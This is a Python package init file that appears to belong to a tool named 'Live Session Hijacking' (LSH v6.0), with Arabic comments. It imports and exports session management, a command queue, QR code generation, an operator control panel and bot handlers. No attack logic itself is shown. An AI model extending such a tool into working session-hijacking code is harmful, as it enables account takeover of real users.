# lsh/__init__.py
# ============================================================
# LSH v6.0 — Global Grade Live Session Hijacking
# نفس الدوال القديمة — لكن محرك جديد بالكامل
# ============================================================

from flask import Blueprint

# ★ الـ Blueprint
lsh_bp = Blueprint('lsh_module', __name__)

# ★ الإعدادات
from .config import (
    redis_client,
    RAILWAY_URL,
    LSH_CONFIG,
    sessions,
    sessions_lock,
    streams_available,
)

# ★ إدارة الجلسات
from .session_mgr import (
    create_session,
    get_session,
    update_session,
    delete_session,
    get_all_sessions,
    session_exists,
    get_session_stats,
    list_live_sessions,
    refresh_session_ttl,
)

# ★ الأوامر — جديد بالكامل
from .commands import (
    push_command,
    pop_commands,
    clear_commands,
    mark_session_active,
    is_session_active,
    get_pending_count,
    ack_command,
    nack_command,
    get_dead_letters,
    retry_dead_letters,
)

# ★ QR
from .qr import generate_qr_code_bytes

# ★ لوحة التحكم
from .panel import build_lsh_control_panel

# ★ Routes
from .routes import init_lsh_routes

# ★ Handlers
from .handlers import set_bot_reference, _handle_incoming

# ★ الاستقرار
from .stability import (
    init_stability,
    shutdown_stability,
    check_all_sessions,
    get_stability_report,
)

# ★ الاستعادة
from .recovery import (
    cleanup_stale_sessions,
    recover_session,
    restore_all_sessions,
    force_reconnect,
)


__all__ = [
    # Core
    'lsh_bp',
    'redis_client',
    'RAILWAY_URL',
    'LSH_CONFIG',
    'sessions',
    'sessions_lock',
    'streams_available',

    # Sessions
    'create_session',
    'get_session',
    'update_session',
    'delete_session',
    'get_all_sessions',
    'session_exists',
    'get_session_stats',
    'list_live_sessions',
    'refresh_session_ttl',

    # Commands
    'push_command',
    'pop_commands',
    'clear_commands',
    'mark_session_active',
    'is_session_active',
    'get_pending_count',
    'ack_command',
    'nack_command',
    'get_dead_letters',
    'retry_dead_letters',

    # QR / Panel
    'generate_qr_code_bytes',
    'build_lsh_control_panel',

    # Routes / Handlers
    'init_lsh_routes',
    'set_bot_reference',
    '_handle_incoming',

    # Stability / Recovery
    'init_stability',
    'shutdown_stability',
    'check_all_sessions',
    'get_stability_report',
    'cleanup_stale_sessions',
    'recover_session',
    'restore_all_sessions',
    'force_reconnect',
]
